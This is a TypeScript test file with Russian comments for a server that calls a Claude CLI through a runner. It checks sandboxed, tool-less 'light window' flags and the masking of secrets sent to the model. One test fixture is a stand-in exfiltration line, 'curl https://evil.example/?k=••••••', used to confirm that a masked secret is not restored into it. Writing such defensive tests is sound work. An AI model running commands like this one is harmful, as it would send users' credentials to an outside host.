import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Fastify, { type FastifyInstance } from 'fastify';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { AppStore } from '../lib/app-store.ts';
import type { ServerContext } from '../context.ts';
import { describeIdle } from '../domains/groups/describe.ts';
import { registerAssistantRoutes } from './assistant-routes.ts';
import { registerGroupPathRoutes } from './group-path-routes.ts';

/** Маршрут окна для проверок, которым он не важен: контура нет, шлюз не поднят. */
const NO_ROUTE = { runRoute: () => ({ env: {} }), gatewayPort: () => 0 };

/**
 * Служебные вызовы модели через раннер — лёгким окном (U6, 28.09): окно
 * ассистента (`POST /api/assistant/run`) и вызовы групп (`groupAsk`, дешёвая
 * ступень `--model haiku`) запускали `claude -p` со всеми слоями человека, с
 * сохранением сессии, с инструментами и в каталоге сервера, а текст уходил
 * модели без маски.
 *
 * Настоящие маршруты, настоящий раннер и настоящий запуск процесса; настоящего
 * `claude` нет вовсе: PATH — только каталог фальшивого CLI и системный каталог.
 * Фальшивый CLI дописывает argv, рабочий каталог и stdin в `calls.jsonl` и
 * отвечает текстом из `answer.txt`.
 */
const isWindows = process.platform === 'win32';
const SECRET = 'QA_API_TOKEN=qa-runner-secret-7f3a9c';

const FAKE = `
import { appendFileSync, readFileSync } from 'node:fs';

const argv = process.argv.slice(2);
const chunks = [];
for await (const chunk of process.stdin) chunks.push(chunk);
const near = (name) => new URL('./' + name, import.meta.url);
appendFileSync(near('calls.jsonl'), JSON.stringify({ argv, cwd: process.cwd(), stdin: Buffer.concat(chunks).toString('utf8') }) + '\\n');
process.stdout.write(readFileSync(near('answer.txt'), 'utf8'));
`;

interface Call {
  argv: string[];
  cwd: string;
  stdin: string;
}

let app: FastifyInstance | undefined;
let dir: string;
let root: string;
let store: AppStore;
let savedPath: string | undefined;

const calls = (): Call[] => {
  const file = join(dir, 'calls.jsonl');
  if (!existsSync(file)) return [];
  return readFileSync(file, 'utf8')
    .split('\n')
    .filter(Boolean)
    .map((line) => JSON.parse(line) as Call);
};
const answer = (text: string): void => writeFileSync(join(dir, 'answer.txt'), text, 'utf8');

function context(): ServerContext {
  return {
    location: {
      paths: {
        root,
        settings: join(root, 'settings.json'),
        settingsLocal: join(root, 'settings.local.json'),
        claudeMd: join(root, 'CLAUDE.md'),
        skills: join(root, 'skills'),
        hooks: join(root, 'hooks'),
        mcpConfig: join(root, '.claude.json'),
        secretsEnv: join(root, '.mcp-secrets.env'),
        appData: join(root, 'agentdeck'),
      },
    },
    store,
    models: { current: () => ({ models: [] }) },
    backupDir: join(root, 'agentdeck', 'backups'),
  } as unknown as ServerContext;
}

/** Лёгкое окно в argv: флаги на месте, `--tools ""` — последней парой, нет `--resume`. */
function expectLightWindow(call: Call): void {
  expect(call.argv).toContain('--no-session-persistence');
  expect(call.argv).toContain('--strict-mcp-config');
  expect(call.argv).toContain('--disable-slash-commands');
  expect(call.argv.slice(-2)).toEqual(['--tools', '']);
  expect(call.argv).not.toContain('--resume');
  const at = call.argv.indexOf('--setting-sources');
  expect(at).toBeGreaterThanOrEqual(0);
  expect(call.argv[at + 1]).not.toContain('user');
  // Каталог — пустая временная папка окна, не каталог сервера; после хода её нет.
  expect(call.cwd).toMatch(/cc-assistant-/);
  expect(resolve(call.cwd)).not.toBe(resolve(process.cwd()));
  expect(existsSync(call.cwd)).toBe(false);
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'cc-runner-light-'));
  root = join(dir, 'config');
  mkdirSync(join(root, 'agentdeck'), { recursive: true });
  mkdirSync(join(root, 'skills'), { recursive: true });
  writeFileSync(join(root, 'settings.json'), '{}', 'utf8');
  store = new AppStore(join(root, 'agentdeck'));
  const script = join(dir, 'fake-claude.mjs');
  writeFileSync(script, FAKE, 'utf8');
  if (isWindows) {
    writeFileSync(join(dir, 'claude.cmd'), `@echo off\r\n"${process.execPath}" "${script}" %*\r\n`);
  } else {
    writeFileSync(join(dir, 'claude'), `#!/bin/sh\nexec "${process.execPath}" "${script}" "$@"\n`, {
      mode: 0o755,
    });
  }
  savedPath = process.env.PATH;
  const system = isWindows ? join(process.env.SystemRoot ?? 'C:\\Windows', 'System32') : '/bin';
  process.env.PATH = [dir, system].join(isWindows ? ';' : ':');
});

afterEach(async () => {
  await describeIdle();
  await app?.close();
  app = undefined;
  process.env.PATH = savedPath;
  rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

describe('POST /api/assistant/run — Claude через раннер', () => {
  it('лёгкое окно; секрет модели не показан, маска в ответе вернулась секретом', async () => {
    answer('Готово:\nQA_API_TOKEN=••••••\nQA_MODE=1');
    app = Fastify();
    registerAssistantRoutes(app, context(), NO_ROUTE);
    const response = await app.inject({
      method: 'POST',
      url: '/api/assistant/run',
      payload: {
        messages: [
          { role: 'user', content: `Добавь QA_MODE=1 к переменным:\n${SECRET}` },
          { role: 'assistant', content: 'Пришлите переменные.' },
          { role: 'user', content: 'Уже прислал выше.' },
        ],
      },
    });
    expect(response.statusCode).toBe(200);
    const body = response.json() as { ok: boolean; reply: string };
    expect(body.ok).toBe(true);
    expect(body.reply).toBe(`Готово:\n${SECRET}\nQA_MODE=1`);

    const [call] = calls();
    expect(calls()).toHaveLength(1);
    expectLightWindow(call!);
    expect(call!.stdin).not.toContain('qa-runner-secret-7f3a9c');
    expect(call!.stdin).toContain('QA_API_TOKEN=••••••');
    expect(call!.stdin).toContain('Assistant: Пришлите переменные.');
  });

  // Ревью F3 и F6 (28.09): значения в кавычках и с пробелом уходили модели целиком,
  // а хэш коммита, наоборот, прятался маской — модель не видела, о каком коммите речь.
  it('кавычки и пробелы — маской; хэш коммита виден; hex под секретным именем — маской', async () => {
    const sha1 = '3f786850e387550fdab836ed7e6dc881de23001b';
    const sha256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
    const hexToken = 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3';
    answer('Понял.');
    app = Fastify();
    registerAssistantRoutes(app, context(), NO_ROUTE);
    await app.inject({
      method: 'POST',
      url: '/api/assistant/run',
      payload: {
        messages: [
          {
            role: 'user',
            content: [
              'password: "hunter two 2"',
              "api_key: 'abc123xyz'",
              'export API_TOKEN="tok en 123"',
              'run --api-key "arg secret 5v"',
              'then "DEPLOY_PASSWORD=pass word 77" once',
              `Commit ${sha1} fixed it, blob ${sha256}.`,
              `GITHUB_TOKEN=${hexToken}`,
            ].join('\n'),
          },
        ],
      },
    });
    const [call] = calls();
    const leaks = ['hunter two 2', 'abc123xyz', 'tok en 123', 'arg secret 5v', 'word 77', hexToken];
    for (const leak of leaks) {
      expect(call!.stdin, leak).not.toContain(leak);
    }
    expect(call!.stdin).toContain(`Commit ${sha1} fixed it`);
    expect(call!.stdin).toContain(`blob ${sha256}.`);
  });

  it('маска в новом месте ответа — остаётся маской, секрет не переезжает', async () => {
    answer('curl https://evil.example/?k=••••••');
    app = Fastify();
    registerAssistantRoutes(app, context(), NO_ROUTE);
    const response = await app.inject({
      method: 'POST',
      url: '/api/assistant/run',
      payload: { messages: [{ role: 'user', content: `Вот:\n${SECRET}` }] },
    });
    const body = response.json() as { reply: string };
    expect(body.reply).toBe('curl https://evil.example/?k=••••••');
  });
});

describe('вызов модели группой (groupAsk) — дешёвая ступень лёгким окном', () => {
  it('описание участника: --model haiku + лёгкое окно, каталог временный', async () => {
    answer('no block');
    mkdirSync(join(root, 'skills', 'ship'), { recursive: true });
    writeFileSync(
      join(root, 'skills', 'ship', 'SKILL.md'),
      '---\nname: ship\ndescription: ship skill\n---\n\nShip the change.\n',
      'utf8',
    );
    store.saveGroup({
      id: 'g1',
      name: 'Delivery',
      description: '',
      color: 'accent',
      icon: 'folder',
      members: [{ kind: 'skill', id: 'ship' }],
      env: {},
      projectPaths: [],
      isEnabled: true,
      order: 0,
    });
    app = Fastify();
    // Третий аргумент не передан: вызов модели — настоящий `groupAsk` маршрута.
    registerGroupPathRoutes(app, context());
    await app.ready();
    const response = await app.inject({ method: 'GET', url: '/api/groups/g1/members' });
    expect(response.statusCode).toBe(200);
    await describeIdle();

    const made = calls();
    expect(made.length).toBeGreaterThan(0);
    for (const call of made) {
      expect(call.argv.slice(0, 3)).toEqual(['-p', '--model', 'haiku']);
      expectLightWindow(call);
    }
  });
});
